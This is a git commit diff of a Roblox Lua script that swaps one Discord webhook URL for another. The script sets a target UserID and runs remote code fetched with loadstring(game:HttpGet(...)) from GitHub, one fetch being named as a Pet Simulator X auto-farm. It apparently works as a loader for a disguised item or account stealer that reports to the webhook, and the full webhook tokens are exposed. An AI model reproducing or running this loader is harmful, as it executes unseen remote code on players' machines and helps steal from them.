5822d4fcf02a1ab47083a39b3b316605105cf13b
Muhammad6916 <124334344+Muhammad6916@users.noreply.github.com>
2023-02-10 11:38:04 +0800

    Update Main.lua

--- Main.lua
+++ Main.lua
@@ -2,6 +2,6 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Muhammad6196/Project-
 
 _G.UserID = 3380431035
 
-_G.WebHook = "https://discord.com/api/webhooks/1073117075922485299/1ZHUpao8r84j0SWx9e0EiJ2_Set5JsIV20pWEzezbBXdfBwVGVj-GxR7vsdKPXGZKcnM"
+_G.WebHook = "https://discord.com/api/webhooks/1073447374522941461/VfdC5m80EvGpM_Ok5wDKAH-Nmm6rCD4XgNzTHg4qZvWQcagpqN-ERVWjNPi3baRMs7o_"
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
